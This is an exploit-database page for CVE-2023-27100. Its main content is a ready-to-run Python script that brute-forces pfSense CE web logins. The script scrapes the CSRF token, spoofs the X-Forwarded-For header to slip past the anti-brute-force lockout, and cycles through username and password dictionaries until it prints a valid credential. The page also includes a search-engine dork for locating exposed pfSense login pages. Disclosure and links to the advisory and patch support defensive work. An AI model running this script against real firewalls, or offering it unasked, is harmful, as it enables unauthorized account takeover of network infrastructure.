---
title: pfsenseCE 2.6.0 Protection Bypass
url: https://cxsecurity.com/issue/WLB-2023040045
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-11
fetch_date: 2025-10-04T11:29:16.885808
---

# pfsenseCE 2.6.0 Protection Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **pfsenseCE 2.6.0 Protection Bypass** **2023.04.10**  Credit:  **[FabDotNET](https://cxsecurity.com/author/FabDotNET/1/)**  Risk: **Medium**  Local: **No**  Remote: **No**  CVE: **[CVE-2023-27100](https://cxsecurity.com/cveshow/CVE-2023-27100/ "Click to see CVE-2023-27100")**  CWE: **N/A**  **[**Dork:** intitle:"pfSense - Login"](https://cxsecurity.com/dorks/)** | |

#!/usr/bin/python3
## Exploit Title: pfsenseCE v2.6.0 - Anti-brute force protection bypass
## Google Dork: intitle:"pfSense - Login"
## Date: 2023-04-07
## Exploit Author: FabDotNET (Fabien MAISONNETTE)
## Vendor Homepage: https://www.pfsense.org/
## Software Link: https://atxfiles.netgate.com/mirror/downloads/pfSense-CE-2.6.0-RELEASE-amd64.iso.gz
## Version: pfSenseCE <= 2.6.0
## CVE: CVE-2023-27100
# Vulnerability
## CVE: CVE-2023-27100
## CVE URL: https://nvd.nist.gov/vuln/detail/CVE-2023-27100
## Security Advisory: https://docs.netgate.com/downloads/pfSense-SA-23\_05.sshguard.asc
## Patch: https://redmine.pfsense.org/projects/pfsense/repository/1/revisions/9633ec324eada0b870962d3682d264be577edc66
import requests
import sys
import re
import argparse
import textwrap
from urllib3.exceptions import InsecureRequestWarning
# Expected Arguments
parser = argparse.ArgumentParser(description="pfsenseCE <= 2.6.0 Anti-brute force protection bypass",
formatter\_class=argparse.RawTextHelpFormatter,
epilog=textwrap.dedent('''
Exploit Usage :
./CVE-2023-27100.py -l http://<pfSense>/ -u user.txt -p pass.txt
./CVE-2023-27100.py -l http://<pfSense>/ -u /Directory/user.txt -p /Directory/pass.txt'''))
parser.add\_argument("-l", "--url", help="pfSense WebServer (Example: http://127.0.0.1/)")
parser.add\_argument("-u", "--usersList", help="Username Dictionary")
parser.add\_argument("-p", "--passwdList", help="Password Dictionary")
args = parser.parse\_args()
if len(sys.argv) < 2:
print(f"Exploit Usage: ./CVE-2023-27100.py -h [help] -l [url] -u [user.txt] -p [pass.txt]")
sys.exit(1)
# Variable
url = args.url
usersList = args.usersList
passwdList = args.passwdList
# Suppress only the single warning from urllib3 needed.
if url.upper().startswith("HTTPS://"):
requests.packages.urllib3.disable\_warnings(category=InsecureRequestWarning)
print('pfsenseCE <= 2.6.0 Anti-brute force protection bypass')
def login(userlogin, userpasswd):
session = requests.session()
r = session.get(url, verify=False)
# Getting CSRF token value
csrftoken = re.search(r'input type=\'hidden\' name=\'\_\_csrf\_magic\' value="(.\*?)"', r.text)
csrftoken = csrftoken.group(1)
# Specifying Headers Value
headerscontent = {
'User-Agent': 'Mozilla/5.0',
'Referer': f"{url}",
'X-Forwarded-For': '42.42.42.42'
}
# POST REQ data
postreqcontent = {
'\_\_csrf\_magic': f"{csrftoken}",
'usernamefld': f"{userlogin}",
'passwordfld': f"{userpasswd}",
'login': 'Sign+In'
}
# Sending POST REQ
r = session.post(url, data=postreqcontent, headers=headerscontent, allow\_redirects=False, verify=False)
# Conditional loops
if r.status\_code != 200:
print(f'[\*] - Found Valid Credential !!')
print(f"[\*] - Use this Credential -> {userlogin}:{userpasswd}")
sys.exit(0)
# Reading User.txt & Pass.txt files
userfile = open(usersList).readlines()
passfile = open(passwdList).readlines()
for user in userfile:
user = user.strip()
for passwd in passfile:
passwd = passwd.strip()
login(user, passwd)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040045)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top